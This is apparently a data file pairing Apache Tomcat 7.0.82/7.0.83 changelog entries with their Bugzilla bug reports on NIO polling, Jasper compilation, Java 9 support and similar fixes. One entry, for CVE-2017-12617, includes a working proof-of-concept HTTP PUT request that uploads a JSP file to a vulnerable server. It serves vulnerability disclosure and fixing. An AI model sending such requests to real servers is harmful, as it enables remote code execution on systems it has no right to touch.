Coyote|Tomcat 7.0.83 (violetagg)|fix|57870|When running on Java 7 or later, take advantage of the new syncFlush parameter when constructing a GZIPOutputStream rather than using the custom FlushableGZIPOutputStream implementation as a work-around. (markt)|backport GzipOutputFilter #doWrite to Tomcat 7 to call GZIPOutputStream to enable flushing via reflection when running on Java 7+|"followup of https://bz.apache.org/bugzilla/show_bug.cgi?id=57866 (short version here)

FlushableGZIPOutputStream does not compress after the first flush() due to a bug in the JVM (already reported upstream).

As per https://bz.apache.org/bugzilla/show_bug.cgi?id=57866#c3 (Konstantin Kolinko):

> Tomcat 8 does not use FlushableGZIPOutputStream, but uses new Java7+ constructor for java.util.zip.GZIPOutputStream to enable flushing.

> It should be possible to backport that to Tomcat 7 to call that constructor via reflection when running on Java 7+."|https://bz.apache.org/bugzilla/show_bug.cgi?id=57870
Coyote|Tomcat 7.0.83 (violetagg)|fix|61736|Improve performance of NIO connector when clients leave large time gaps between network packets. Patch provided by Zilong Song. (markt)|NIO BlockPoller may stay at events() method for too long time|"Created attachment 35508 [details]
An Http Client which is able to send data in controlled packet size and packet interval.

When using tomcat in NIO mode as a server to receive files, and if the files are transferred via a non-stable network (there is an obvious interval between neighbor TCP packets), then the traffic always hang for a great while with zero window reported from server. Following are the steps to reproduce the problem.

1. Configure the server tcp receive window size.
$ cat /proc/sys/net/ipv4/tcp_rmem
1024	2048	8192

2. Put the following JSP into the ROOT project. (in the path $CATALINA_HOME/webapps/ROOT/consume.jsp)
<%@ page import=""org.apache.commons.io.IOUtils"" %><%
    final ServletInputStream inputStream = request.getInputStream();
    byte[] content = IOUtils.toByteArray(inputStream);
%>ok
The IOUtils is a class from commons-io

3. Start tomcat in NIO mode with the following settings
Server version:        Apache Tomcat/8.0.46
Server built:          Aug 10 2017 10:10:31 UTC
Server number:         8.0.46.0
OS Name:               Linux
OS Version:            3.10.0-229.el7.x86_64
Architecture:          amd64
Java Home:             /usr/jdk1.8.0_121/jre
JVM Version:           1.8.0_121-b13
JVM Vendor:            Oracle Corporation
Command line argument: -Xms256m
Command line argument: -Xmx256m
Command line argument: -Xmn128m
Command line argument: -Xss1m

4. Capture the TCP traffics.
tcpdump -i any -w tcp.cap port 8080

5. Start a client. sending data with http in chunks with the following settings:
chunk size                   1024 byte
time to rest between chunks  50 ms
chunk count per request      100
parallel requests            100
total requests               10000

6. Then we will got a lot of zero window packets, which lasts several seconds.
No.     stream     Time               Source              Destination         ack        win        Length Info
 469817 3201       15:09:04.175309    172.16.1.4          172.16.1.5          1          29696      57     [TCP segment of a reassembled PDU]
 469904 3201       15:09:04.214945    172.16.1.5          172.16.1.4          4238       1024       54     8080‚Üí58750 [ACK] Seq=1 Ack=4238 Win=1024 Len=0
 470091 3201       15:09:04.437137    172.16.1.4          172.16.1.5          1          29696      1078   [TCP Window Full] [TCP segment of a reassembled PDU]
 470092 3201       15:09:04.437142    172.16.1.5          172.16.1.4          5262       0          54     [TCP ZeroWindow] 8080‚Üí58750 [ACK] Seq=1 Ack=5262 Win=0 Len=0
 470334 3201       15:09:04.657120    172.16.1.4          172.16.1.5          1          29696      54     [TCP Keep-Alive] 58750‚Üí8080 [ACK] Seq=5261 Ack=1 Win=29696 Len=0
 470335 3201       15:09:04.657123    172.16.1.5          172.16.1.4          5262       0          54     [TCP ZeroWindow] 8080‚Üí58750 [ACK] Seq=1 Ack=5262 Win=0 Len=0
 470620 3201       15:09:05.098135    172.16.1.4          172.16.1.5          1          29696      54     [TCP Keep-Alive] 58750‚Üí8080 [ACK] Seq=5261 Ack=1 Win=29696 Len=0
 470621 3201       15:09:05.098141    172.16.1.5          172.16.1.4          5262       0          54     [TCP ZeroWindow] 8080‚Üí58750 [ACK] Seq=1 Ack=5262 Win=0 Len=0
 471017 3201       15:09:05.979136    172.16.1.4          172.16.1.5          1          29696      54     [TCP Keep-Alive] 58750‚Üí8080 [ACK] Seq=5261 Ack=1 Win=29696 Len=0
 471018 3201       15:09:05.979140    172.16.1.5          172.16.1.4          5262       0          54     [TCP ZeroWindow] 8080‚Üí58750 [ACK] Seq=1 Ack=5262 Win=0 Len=0
 471619 3201       15:09:07.743148    172.16.1.4          172.16.1.5          1          29696      54     [TCP Keep-Alive] 58750‚Üí8080 [ACK] Seq=5261 Ack=1 Win=29696 Len=0
 471620 3201       15:09:07.743151    172.16.1.5          172.16.1.4          5262       0          54     [TCP ZeroWindow] 8080‚Üí58750 [ACK] Seq=1 Ack=5262 Win=0 Len=0
 475765 3201       15:09:08.545625    172.16.1.5          172.16.1.4          5262       3072       54     [TCP Window Update] 8080‚Üí58750 [ACK] Seq=1 Ack=5262 Win=3072 Len=0
 475781 3201       15:09:08.545815    172.16.1.4          172.16.1.5          1          29696      490    [TCP segment of a reassembled PDU]
 475782 3201       15:09:08.545821    172.16.1.5          172.16.1.4          5698       3072       54     8080‚Üí58750 [ACK] Seq=1 Ack=5698 Win=3072 Len=0
 475784 3201       15:09:08.545825    172.16.1.4          172.16.1.5          1          29696      1514   [TCP segment of a reassembled PDU]


After a lot of study, I found this is because of a BUG in the BlockPoller, which will slow down the speed of polling cycle a lot.

The BlockPoller will always try to poll the Runnable event and run it until the events queue is empty. But the RunnableAdd event may wake the Worker thread, and the worker thread may add another more event to the queue. Thus the queue will be hard to shrink, and the events method will be hard to return and will affect the latency the next selection to be performed.

// events() method of the BlockPoller thread
public boolean events() {
    boolean result = false;
    Runnable r = null;
    result = (events.size() > 0);
    while ( (r = events.poll()) != null ) {
        // running the ""r"" event may cause more events to 
        // be added to the queue. then the queue will be hard 
        // to shrink, and the loop may be hard to finish
        r.run();
        result = true;
    }
    return result;
}

// the following e1 and e2 line in the RunnableAdd will wake the worker thread
public void run() {
    SelectionKey sk = ch.keyFor(selector);
    try {
        if (sk == null) {
            sk = ch.register(selector, ops, key);
            ref.key = sk;
        } else if (!sk.isValid()) {
            cancel(sk, key, ops); // <-- e1
        } else {
            sk.interestOps(sk.interestOps() | ops);
        }
    } catch (CancelledKeyException cx) {
        cancel(sk, key, ops); // <-- e2
    } catch (ClosedChannelException cx) {
        cancel(null, key, ops);
    }
}

// when the worker is waken at line L3, it will start the next loop
// and may add another event at line L2
public int read(ByteBuffer buf, NioChannel socket, long readTimeout) throws IOException {
    SelectionKey key = socket.getIOChannel().keyFor(socket.getPoller().getSelector());
    if ( key == null ) throw new IOException(""Key no longer registered"");
    KeyReference reference = keyReferenceStack.pop();
    if (reference == null) {
        reference = new KeyReference();
    }
    NioSocketWrapper att = (NioSocketWrapper) key.attachment();
    int read = 0;
    boolean timedout = false;
    int keycount = 1; 
    long time = System.currentTimeMillis(); 
    try {
L1:     while(!timedout) {
            if (keycount > 0) {
                read = socket.read(buf);
                if (read != 0) {
                    break;
                }
            }
            try {
                if ( att.getReadLatch()==null || att.getReadLatch().getCount()==0) att.startReadLatch(1);
L2:             poller.add(att,SelectionKey.OP_READ, reference);
                if (readTimeout < 0) {
                    att.awaitReadLatch(Long.MAX_VALUE, TimeUnit.MILLISECONDS);
                } else {
L3:                 att.awaitReadLatch(readTimeout, TimeUnit.MILLISECONDS);
                }
            } catch (InterruptedException ignore) {
                // Ignore
            }
            if ( att.getReadLatch()!=null && att.getReadLatch().getCount()> 0) {
                keycount = 0;
            }else {
                keycount = 1;
                att.resetReadLatch();
            }
            if (readTimeout >= 0 && (keycount == 0))
                timedout = (System.currentTimeMillis() - time) >= readTimeout;
        } //while
        if (timedout)
            throw new SocketTimeoutException();
    } finally {
        poller.remove(att,SelectionKey.OP_READ);
        if (timedout && reference.key!=null) {
            poller.cancelKey(reference.key);
        }
        reference.key = null;
        keyReferenceStack.push(reference);
    }
    return read;
}

In fact there is such an occasion where the previous case will happen:

 1. [Worker]: added an event, and wait on the readLatch
 2. [BlockPoller]: registered operation interest on corresponding SelectionKey
 3. [BlockPoller]: perform selection
 4. [BlockPoller]: wake the Worker on the selection result
 5. [Worker]: wake up, read data success
 6. [Worker]: add remove event (e1) to the queue, and return from the read method
 7. [Worker]: Outside call the read method again
 8. [Worker]: read data and got nothing
 9. [Worker]: add an event (e2) via the poller.add(att, ops, ref) method
10. [Worker]: wait on the readLatch
11. [BlockPoller]: enter next loop, and execute the events() method, polling events from the events queue and run them.
12. [BlockPoller]: got e1 and run it, the SelectionKey turn invalid (before next selection, the SelectionKey is always invalid)
13. [BlockPoller]: got e2 and run it, since the SelectionKey is invalid, it will wake the worker thread, and discard the event.
14. [BlockPoller]: poll other events from the queue, and run them
15. [Worker]: (before queue empty) waken up, and read again, but got nothing
16. [Worker]: add another event (e3) via the poller.add(att, ops, ref) method
17. [Worker]: wait on the readLatch again
18. [BlockPoller]: got e3 and run it, found it invalid again, wake the worker thread, and discard the event.
19. [Worker]: being waken up again and add event again...


steps between 11 to 17 will repeat again and again (step 18 and later is a replay of the steps), if each time the event add in step 16 add the event to the queue before the queue is consumed to empty, because the BlockPoller will always try to empty the queue. 

Then the BlockPoller and the worker will enter a strange loop, where the BlockPoller will try to empty the queue, while the worker will always add some more events to the queue.

My solution to prevent this problem, is to prevent the BlockPoller from trying to empty the queue before move to the selection step, instead, make it only handle events in the queue when it starts to handle them, further events added later will not be handled during this BlockPoller loop, but instead delay to the next loop. The selection operation will remove all invalid SelectionKeys, so in the time of the next loop, the problem will not happen again, since the SelectionKeys are all fresh and valid."|https://bz.apache.org/bugzilla/show_bug.cgi?id=61736
Jasper|Tomcat 7.0.83 (violetagg)|add||Enable Jasper to compile JSPs for Java 9. In addition to configuring the JSP servlet with for Java 9 via the compilerSourceVM and compilerTargetVM, it is necessary to replace ecj-4.4.2.jar with a more recent version that supports Java 9. (markt)|||
Jasper|Tomcat 7.0.83 (violetagg)|fix|61816|Invalid expressions in attribute values or template text should trigger a translation (compile time) error, not a run time error. (markt)|Jsp Precompile doesn't fail on ${}|"Fails at runtime with:

Failed to parse the expression [${}] Encountered "" ""}"" ""} """" at line 1, column 3.
Was expecting one of:
""{"" ...
<INTEGER_LITERAL> ...
<FLOATING_POINT_LITERAL> ...
<STRING_LITERAL> ...
""true"" ...
""false"" ...
""null"" ...
""("" ...
""["" ...
""!"" ...
""not"" ...
""empty"" ...
""-"" ...
...
...
""("" ..."|https://bz.apache.org/bugzilla/show_bug.cgi?id=61816
WebSocket|Tomcat 7.0.83 (violetagg)|fix|61604|Add support for authentication in the websocket client. Patch submitted by J Fernandez. (remm)|IllegalStateException in SmapStratum on empty JSP|"We use a JSP that is included at several points to inject data into pages. At the moment the whole content is commented out.

Tomcat 8.5 (production environment) ignores that page, respectively generates no output as expected. Tomcat 9.0.1 (development environment) throws an IllegalstateException. This is caused by a change in SmapStratum, which previously returned null on getString() if lineData was null, now it throws an unhandled exception.

Reproduction:

Create an ""empty"" JSP or one containing only JSP comments and using trimDirectiveWhitespaces=""true"":

<%@ page pageEncoding=""UTF-8"" contentType=""text/html; charset=utf-8"" language=""java"" import=""java.util.Vector"" errorPage="""" trimDirectiveWhitespaces=""true"" %>
<%-- This is a comment --%>

Result:

java.lang.IllegalStateException
        at org.apache.jasper.compiler.SmapStratum.getSmapStringInternal(SmapStratum.java:318)
        at org.apache.jasper.compiler.SmapStratum.getSmapString(SmapStratum.java:304)
        at org.apache.jasper.compiler.SmapUtil.installSmap(SmapUtil.java:145)
        at org.apache.jasper.compiler.JDTCompiler.generateClass(JDTCompiler.java:473)
[...]

Expected result:

an empty page"|https://bz.apache.org/bugzilla/show_bug.cgi?id=61604
Web applications|Tomcat 7.0.83 (violetagg)|fix|61603|Add XML filtering for the status servlet output where needed. (remm)|Not-well-formed XML returned from /manager/status?XML=true when running Java 9|"Hello!

When running Tomcat 8.5.23 or Tomcat 9.0.1 for that matter with Java 9
the response from /manager/status?XML=true is returning not-well-formed XML data.

Expected behaviour:
Getting well-formed XML.

Actual behaviour:
Getting non-well-formed XML.

Reproducible:
Always when run on Java 9.

Example snippet of offending output:
<memorypool name='CodeHeap 'non-nmethods'' type='Non-heap memory' usageInit='2555904' usageCommitted='2555904' usageMax='5836800' usageUsed='1469952'/>

Please note the apostrophes surrounding non-nmethods, which should be escaped.

Possible solution:
Ensure all String attribute values are XML-escaped.

Thank you."|https://bz.apache.org/bugzilla/show_bug.cgi?id=61603
Web applications|Tomcat 7.0.83 (violetagg)|fix||Correct the description of how the CGI servlet maps a request to a script in the CGI How-To. (markt)|||
Tribes|Tomcat 7.0.83 (violetagg)|fix||Fix incorrect behavior that attempts to resend channel messages more than the actual setting value of maxRetryAttempts. (kfujino)|||
Tribes|Tomcat 7.0.83 (violetagg)|fix||Ensure that the remaining Sender can send channel messages by avoiding unintended ChannelException caused by comparing the number of failed members and the number of remaining Senders. (kfujino)|||
Tribes|Tomcat 7.0.83 (violetagg)|fix||Ensure that remaining SelectionKeys that were not handled by throwing a ChannelException during SelectionKey processing are handled. (kfujino)|||
Other|Tomcat 7.0.83 (violetagg)|fix||Improve the fix for 61439 and exclude the JPA, JAX-WS and EJB annotations completely from the Tomcat distributions. (markt)|Stop shipping JavaEE APIs as part as tomcat-embed-core|"This relates to #59899 and the support of Java9 which is summarized in this Spring Boot issue: https://github.com/spring-projects/spring-boot/issues/9366

Essentially, we are wondering if you would consider stop shipping JavaEE APIs and rather rely on official JAR(s). That way, we (and anyone) could apply regular build exclusion in case we are shipping it ourselves or if we want to provide a more recent version."|https://bz.apache.org/bugzilla/show_bug.cgi?id=61439
Other|Tomcat 7.0.83 (violetagg)|fix||Improve handling of endorsed directories. The endorsed directory mechanism will only be used if the JAVA_ENDORSED_DIRS system property is explicitly set or if $CATALINA_HOME/endorsed exists. When running on Java 9, any such attempted use of the endorsed directory mechanism will trigger an error and Tomcat will fail to start. (rjung)|||
Other|Tomcat 7.0.83 (violetagg)|code||Refactoring in preparation for Java 9. Refactor to avoid using some methods that will be deprecated in Java 9 onwards. (markt)|||
Other|Tomcat 7.0.83 (violetagg)|add|51496|When using the Windows installer, check if the requested service name already exists and, if it does, prompt the user to select an alternative service name. Patch provided by Ralph Plawetzki. (markt)|NSIS - Warn that duplicate service name will result in install failure|"It was noticed on the users list, that it is not possible to install two copies of Tomcat with the same service name.

http://markmail.org/message/rcmayrkydamywbpw

It would be preferable to check for a duplicate name before starting the installation, but I do not know of a way to check existing service names in installer.

Is there an API method, or maybe we can look up in the Registry?


It looks that when this error occurs it is too late to go back to the configuration pages, or to specify a different name. At least we can tweak text of the message that appears. The current text is:

""Failed to install Tomcat7 service.
Check your settings and permissions.
Ignore and continue anyway (not recommended)?"" abort|retry|ignore"|https://bz.apache.org/bugzilla/show_bug.cgi?id=51496
Other|Tomcat 7.0.83 (violetagg)|fix||Add necessary Java 9 configuration options to the startup scripts to prevent warnings being generated on web application stop. (markt)|||
Other|Tomcat 7.0.83 (violetagg)|fix|61590|Enable service.bat to recognise when JAVA_HOME is configured for a Java 9 JDK. (markt)|service.bat fails to recognize JDK 9|"Created attachment 35399 [details]
Patch to correctly detect JDK 9

When trying to install Tomcat 9.0.1 on Windows (x64) where the JAVA_HOME environment variable points to the JDK 9, service.bat fails to recognize the Java binaries:

> C:\apache-tomcat-9.0.1\bin>service install
> The JAVA_HOME environment variable is not defined correctly
> This environment variable is needed to run this program
> NB: JAVA_HOME should point to a JDK not a JRE

This is because service.bat checks for ""java.exe"", ""javaw.exe"" and ""server\jvm.dll"" within a ""jre\bin"" directory, but the ""jre"" directory doesn't exist on JDK 9.

Instead, the necessary binaries can be found directly within the JDK's ""bin"" folder.


Note: Running the Tomcat Service using the SYSTEM user (root) works, but if you want to run the Tomcat Service as a different user with Java 9, it seems that additionally to having access to the Tomcat directory (e.g. ""D:\Tomcat""), the user also must have read access access to its parent directory (e.g. ""D:\"") (or even the drive root) for some reason.
Otherwise (if the user only has access to the Tomcat directory), starting the service will fail and the following error will be printed to stderr.log:

> 2017-10-07 14:52:24 Commons Daemon procrun stderr initialized
> java.lang.NoClassDefFoundError: org/apache/catalina/startup/Bootstrap
> Caused by: java.lang.ClassNotFoundException: > org.apache.catalina.startup.Bootstrap
>    at > java.base/jdk.internal.loader.BuiltinClassLoader.loadClass(BuiltinClassLoader.java:582)
>    at > java.base/jdk.internal.loader.ClassLoaders$AppClassLoader.loadClass(ClassLoaders.java:185)
>    at java.base/java.lang.ClassLoader.loadClass(ClassLoader.java:496)
Exception in thread ""main"" 

This isn't the case with Java 8, where it is sufficient to have access to only the Tomcat directory."|https://bz.apache.org/bugzilla/show_bug.cgi?id=61590
Other|Tomcat 7.0.83 (violetagg)|fix|61598|Update the Windows installer to search the new (as of Java 9) registry locations when looking for a JRE. (markt)|Update Windows Installer to also search registry for JRE in Java 9 location|"Java 9:
SOFTWARE\JavaSoft\JRE

Java 8 and earlier:
SOFTWARE\JavaSoft\Java Runtime Environment"|https://bz.apache.org/bugzilla/show_bug.cgi?id=61598
Other|Tomcat 7.0.83 (violetagg)|add||Add generation of a SHA-512 hash for release artifacts to the build script. (markt)|||
Other|Tomcat 7.0.83 (violetagg)|fix|61658|Update MIME mappings for fonts to use font/* as per RFC8081. (markt)|Update mime-mappings for font mime-types to use font/*, per RFC8081|"In recently released Apache HTTPD 2.4.29 the mime mappings for fonts in its conf/mime.types file were updated from application/* to font/*.

Commit: r1810122

RFC8081, published in February 2017:
https://tools.ietf.org/html/rfc8081

Discussion on dev@httpd:
""mime type woff woff2"" on 2017-09-18
http://httpd.markmail.org/thread/fvzh4r7qh55drtk6

I think that r1810122 can be backported to Apache Tomcat."|https://bz.apache.org/bugzilla/show_bug.cgi?id=61658
Other|Tomcat 7.0.83 (violetagg)|update||Update the packaged version of the Tomcat Native Library to 1.2.16 to pick up the latest Windows binaries built with APR 1.6.3 and OpenSSL 1.0.2m. (markt)|||
Other|Tomcat 7.0.83 (violetagg)|update||Update the NSIS Installer used to build the Windows installer to version 3.02.1. (kkolinko)|||
Other|Tomcat 7.0.83 (violetagg)|update||"Update the Windows installer to use ""The Apache Software Foundation"" as the Publisher when Tomcat is displayed in the list of installed applications in Microsoft Windows. (kkolinko)"|||
Other|Tomcat 7.0.83 (violetagg)|fix|61803|Remove outdated SSL information from the Security documentation. (remm)|Documentation for sslEnabledProtocols describes the incorrect way to set this option|"In webapps/docs/security-howto.xml the following documentation is provided for
the sslEnabledProtocols option.

304       <p>The <strong>sslEnabledProtocols</strong> attribute determines which
305       versions of the SSL/TLS protocol are used.  Since the POODLE attack in
306       2014, all SSL protocols are considered unsafe and a secure setting for
307       this attribute in a standalone Tomcat setup might be
308       <code>sslEnabledProtocols=""TLSv1,TLSv1.1,TLSv1.2""</code></p>

This documentation also includes an example of setting this option.

When this is syntax is used you get the following warning text printed into
the log.

WARN - The protocol [TLSv1.1] was added to the list of protocols on the 
SSLHostConfig named [_default_]. Check if a +/- prefix is missing.

Inside org/apache/tomcat/util/net/SSLHostConfig.java there is a comment describing
the expected format for this options and how its parsed.

441         // List of protocol names, separated by "","", ""+"" or ""-"".
442         // Semantics is adding (""+"") or removing (""-"") from left
443         // to right, starting with an empty protocol set.
444         // Tokens are individual protocol names or ""all"" for a
445         // default set of supported protocols.
446         // Separator "","" is only kept for compatibility and has the
447         // same semantics as ""+"", except that it warns about a potentially
448         // missing ""+"" or ""-"".

I've never written a patch before but I'm keen to assist if I can get some guidance."|https://bz.apache.org/bugzilla/show_bug.cgi?id=61803
Catalina|Tomcat 7.0.82 (violetagg)|fix|61210|When running under a SecurityManager, do not print a warning about not being able to read a logging configuration file when that file does not exist. (markt)|When using the Security Manager, Tomcat prints warning about a non-existent file|"I noticed that when using the Security Manager in Tomcat you always see the following warning messages on startup (one for every application that's deployed):

~~~
WARNING [localhost-startStop-1] org.apache.juli.ClassLoaderLogManager.readConfiguration Reading /apache-tomcat-8.5.15/webapps/ROOT/WEB-INF/classes/logging.properties is not permitted. See ""per context logging"" in the default catalina.policy file.
WARNING [localhost-startStop-1] org.apache.juli.ClassLoaderLogManager.readConfiguration Reading /apache-tomcat-8.5.15/webapps/examples/WEB-INF/classes/logging.properties is not permitted. See ""per context logging"" in the default catalina.policy file.
WARNING [localhost-startStop-1] org.apache.juli.ClassLoaderLogManager.readConfiguration Reading /apache-tomcat-8.5.15/webapps/docs/WEB-INF/classes/logging.properties is not permitted. See ""per context logging"" in the default catalina.policy file.
~~~

While the message is technically accurate (reading the file is prohibited), it isn't pertinent to the user because the file may not (doesn't in this case) exist in any of these three applications. Is it possible to check that the file exists at this point so that we can only print the message when it's present? Do so would remove an extra warning (that may not be applicable) from the log file and give users a clean vanilla log to start with."|https://bz.apache.org/bugzilla/show_bug.cgi?id=61210
Catalina|Tomcat 7.0.82 (violetagg)|add|61280|Add RFC 7617 support to the BasicAuthenticator. Note that the default configuration does not change the existing behaviour. (markt)|Support characters sets other than ISO 8859-1 in HTTP Basic authentication|"https://tools.ietf.org/html/rfc7617

This RFC describes how to implement Basic authentication for usernames and passwords that are not restricted to characters below U+0100.

The BasicAuthenticator class should be updated to refer to RFC 7617 instead of the obsolete RFC 2617.

The character set used in BasicAuthenticator class should be made configurable."|https://bz.apache.org/bugzilla/show_bug.cgi?id=61280
Catalina|Tomcat 7.0.82 (violetagg)|fix|61452|Fix a copy paste error that caused an UnsupportedEncodingException when using WebDAV. (markt)|java.io.UnsupportedEncodingException: UTF_8 when using WebDAV servlet|"When using the WebDAV servlet, the log shows java.io.UnsupportedEncodingException: UTF_8 exceptions on requests.

Reproduction steps;
- Download and unzip tomcat version 7.0.81
- Unzip the webdav.zip webdav in the root of the tomcat.
- Start the Tomcat server 
- Connect with anyclient to http://localhost:8080/webdav/
- See the stacktrace in the console.

java.io.UnsupportedEncodingException: UTF_8
        at sun.nio.cs.StreamEncoder.forOutputStreamWriter(StreamEncoder.java:61)
        at java.io.OutputStreamWriter.<init>(OutputStreamWriter.java:100)
        at org.apache.catalina.util.URLEncoder.encode(URLEncoder.java:170)
        at org.apache.catalina.servlets.WebdavServlet.rewriteUrl(WebdavServlet.java:444)
        at org.apache.catalina.servlets.WebdavServlet.parseProperties(WebdavServlet.java:2122)
        at org.apache.catalina.servlets.WebdavServlet.doPropfind(WebdavServlet.java:702)
<SNIP>

I have traced this to org.apache.catalina.servlets.WebdavServlet.rewriteUrl(String) . The implementation for tc7.x is;
  return URL_ENCODER_XML.encode(path, ""UTF_8"");
For tc8.5 it is;
  return URL_ENCODER_XML.encode(path, StandardCharsets.UTF_8);

I suspect that this is a pretty simple copy-paste error. The string should probably be changed from ""UTF_8"" (with underscore) to ""UTF-8"" (with a dash). But i have not tested this."|https://bz.apache.org/bugzilla/show_bug.cgi?id=61452
Catalina|Tomcat 7.0.82 (violetagg)|fix||Correct regression in 7.0.80 that broke the use of relative paths with the extraResourcePaths attribute of a VirtualDirContext. (markt)|||
Catalina|Tomcat 7.0.82 (violetagg)|add|61489|When using the CGI servlet, make the generation of command line arguments from the query string (as per section 4.4 of RFC 3875) optional. The feature is enabled by default for consistency with previous releases. Based on a patch by jm009. (markt)|Disable creation of command line parameters from GET parameters in the URL for CGIServlet|"Created attachment 35290 [details]
Make creation of command line parameters from GET parameters optional

The CGI RFC says, that the server SHOULD create command line arguments from certain GET parameters.

https://tools.ietf.org/html/rfc3875#section-4.4
4.4.  The Script Command Line


I don't like this, because I think, this can be a security risk in certain cases.
I suggest to disable this feature by default, or at least allow to disable it by configuration.

The proposed patch makes this feature configurable.
The line

private boolean enableCmdLineArguments = false;

makes the feature disabled by default. Putting ""= true"" would make it enabled by default."|https://bz.apache.org/bugzilla/show_bug.cgi?id=61489
Catalina|Tomcat 7.0.82 (violetagg)|fix||Correct a regression in 7.0.80 and 7.0.81 that wrapped the DirContext that represented the web application in a ProxyDirContext twice rather than just once. (markt)|||
Catalina|Tomcat 7.0.82 (violetagg)|fix|61542|Fix CVE-2017-12617 and prevent JSPs from being uploaded via a specially crafted request when HTTP PUT was enabled. (markt)|Apache Tomcat Remote Code Execution via JSP Upload bypass|"Description:
When running on Windows with HTTP PUTs enabled (e.g. via setting the
readonly initialisation parameter of the Default to false) it was
possible to upload a JSP file to the server via a specially crafted
request. This JSP could then be requested and any code it contained
would be executed by the server.

the poc is like this:
PUT /1.jsp/ HTTP/1.1
Host: 192.168.3.103:8080
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
Referer: http://192.168.3.103:8080/examples/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.8,zh-CN;q=0.6,zh;q=0.4,zh-TW;q=0.2
Cookie: JSESSIONID=A27674F21B3308B4D893205FD2E2BF94
Connection: close
Content-Length: 26

<% out.println(""hello"");%>

it is the bypass for CVE-2017-12615"|https://bz.apache.org/bugzilla/show_bug.cgi?id=61542
Catalina|Tomcat 7.0.82 (violetagg)|fix||Use the correct path when loading the JVM logging.properties file for Java 9. (rjung)|||
Catalina|Tomcat 7.0.82 (violetagg)|fix|61554|Exclude test files in unusual encodings and markdown files intended for display in GitHub from RAT analysis. Patch provided by Chris Thistlethwaite. (markt)|Add excludes to rat-excludes.txt for Tomcat9|"Created attachment 35345 [details]
Patch for rat-excludes in tomcat9

Rat is not producing reports for Tomcat9 as the xml output contains invalid characters. 

Please see bug 60170 for reference. 

-Chris T."|https://bz.apache.org/bugzilla/show_bug.cgi?id=61554
Coyote|Tomcat 7.0.82 (violetagg)|fix|48655|Enable Tomcat to shutdown cleanly when using sendfile, the APR/native connector and a multi-part download is in progress. (markt)|Active multipart downloads prevent tomcat shutdown.|"I was testing stability of Tomcat Native for high performance file downloads.  Specifically I was downloading a 2GB file using a download manager that supports multi-part downloads (simultaneous download of file segments).  Download works fine, however, if you try to shutdown tomcat during the multipart download it hangs indefinitely and the CPU of the tomcat java process goes up.  (Single part downloads work fine, completed multi-part download causes no shutdown problems, and with tomcat native turned off the shutdown works fine.)

Tomcat version:  6.0.24
OS:  Windows XP SP3
Tomcat Native binaries from:
  http://apache.16degrees.com.au/tomcat/tomcat-connectors/native/1.1.19/binaries/
APR binaries:  apr-1.3.6-iconv-1.2.1-util-1.3.8-win32-x86-msvcrt60.zip"|https://bz.apache.org/bugzilla/show_bug.cgi?id=48655
Coyote|Tomcat 7.0.82 (violetagg)|fix|58244|Handle the case when OpenSSL resumes a TLS session using a ticket and the full client certificate chain is not available. In this case the client certificate without the chain will be presented to the application. (markt)|two way SSL loses client certificate after a few requests|"When accessing a web application that uses client certificate authentication run on Tomcat/APR (on Windows) with Firefox or Chrome, the client cert is ""lost"" after a short while. To the app it appears the client certificate was not sent.

Example code (JSP fragment, can be the only content of a JSP file):

User client cert data:
<%= ((java.security.cert.X509Certificate[])
request.getAttribute(""javax.servlet.request.X509Certificate""))[0].
getSubjectX500Principal().toString()%>

After a few refreshes of the page (where it will show the client certificate DN) the page will fail with a NullPointerException as request.getAttribute will return null. It usually happens in less than a minute. To be more precise: when reloading about once per second, the problem occurs almost every time after 30 seconds. After that each request will fail the same way, until I restart tomcat.

This happens with Firefox (v39 and v40) and Chrome (v44), but not with IE v11.

It also occurs with different versions of tomcat and Java (and OS bitness) - see below for a list.

A simple test case using latest versions is:

    download and extract apache-tomcat-8.0.24-windows-x64.zip
    in the webapps folder create a folder named cert, there create a file named ccertA.jsp that contains the above code snippet

    in server.xml add a line:

    <Connector port=""8443"" protocol=""org.apache.coyote.http11.Http11AprProtocol"" secure=""true"" scheme=""https"" maxThreads=""150"" URIEncoding=""UTF-8"" SSLVerifyClient=""optional"" SSLProtocol=""TLSv1+TLSv1.1+TLSv1.2"" SSLPassword=""testing"" SSLEnabled=""true"" SSLCertificateKeyFile=""C:/your_server_key_private.pem"" SSLCertificateFile=""C:/ your_server_key _public.pem"" SSLCACertificateFile=""C:/supported_client_CAs.pem"" />

    start tomcat by executing startup.bat
    open the page https://localhost:8443/cert/ccertA.jsp and keep refreshing it every few seconds
    After about 30 seconds it will show a NPE exception error page.

If I don't use APR (by deleting the tcnative-1.dll file and adapting the connector syntax for JSSE) the problem does not happen.

Tried versions, all having the issue:

    apache-tomcat-8.0.24-windows-x64 (also 32 bit version) - has APR 1.5.1 and TCN 1.1.33
    apache-tomcat-6.0.44-windows-x64
    Java 1.6.0 Updates 12 and 45
    Java 1.8 Update 51
    Windows 7 Pro SP1 64 bit
    Windows 7 Pro SP1 32 bit
    Window 8.1 Pro 64 bit
    Windows 10 Home 64 bit
    Firefox versions 39.0 39.0.3 and 44
    Chrome v44
    Ubuntu 14.04 LTS 64 bit / tomcat 7.0.52-1ubuntu0.3 / libapr1:amd64 1.5.0-1 / libtcnative-1:amd64 1.1.29-1

A similar issue was discussed on the tomcat-users mailing list in 2010: ""Client certificate gone after 1 minute timeout (SSL, APR)"" [1] but with no solution. I posted there myself recently ( ""Firefox SSL with APR - losing client certificate"" [2] has a bit more details), but it is basically just my monologue.


Originally I tested with a server certificate issued by my private testing CA. Now I also tried with a ""real"" certificate issued by trusted CA. (I used my personal certificate. The browser complained about the hostname mitmatch which I clicked away).


Can upload test CA, server-cert/key and client cert/key for test if requiered.

[1] http://grokbase.com/t/tomcat/users/102pdv412y/client-certificate-gone-after-1-minute-timeout-ssl-apr
[2] http://www.mail-archive.com/users@tomcat.apache.org/msg118902.html"|https://bz.apache.org/bugzilla/show_bug.cgi?id=58244
Coyote|Tomcat 7.0.82 (violetagg)|fix||Fix random SocketTimeoutExceptions when reading the request InputStream. Based on a patch by Peter Major. (markt)|||
Coyote|Tomcat 7.0.82 (violetagg)|fix|60900|Avoid a NullPointerException in the APR Poller if a connection is closed at the same time as new data arrives on that connection. (markt)|org.apache.tomcat.util.net.AprEndpoint$Poller.run throws java.lang.NullPointerException|"Created attachment 34866 [details]
